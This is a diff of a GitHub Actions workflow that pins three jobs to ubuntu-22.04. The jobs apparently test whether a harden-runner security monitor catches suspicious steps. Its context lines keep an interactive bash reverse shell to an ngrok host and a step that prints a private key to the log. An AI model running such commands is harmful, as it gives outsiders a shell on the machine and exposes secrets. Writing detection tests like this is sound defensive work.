@@ -4,7 +4,7 @@ on:
 
 jobs:
   unauthorized-outbound-call:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-22.04
     steps:
     - uses: prateek-stepsecurity/harden-runner@int
       with:
@@ -33,7 +33,7 @@ jobs:
           bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 17658 0>&1" 
 
   handle-private-key:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-22.04
     steps:
     - uses: prateek-stepsecurity/harden-runner@int
       with:
@@ -54,7 +54,7 @@ jobs:
         echo "Private key content:"
         cat private_key.pem
   anomalous-outbound-call:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-22.04
     steps:
     - uses: prateek-stepsecurity/harden-runner@int
       with:
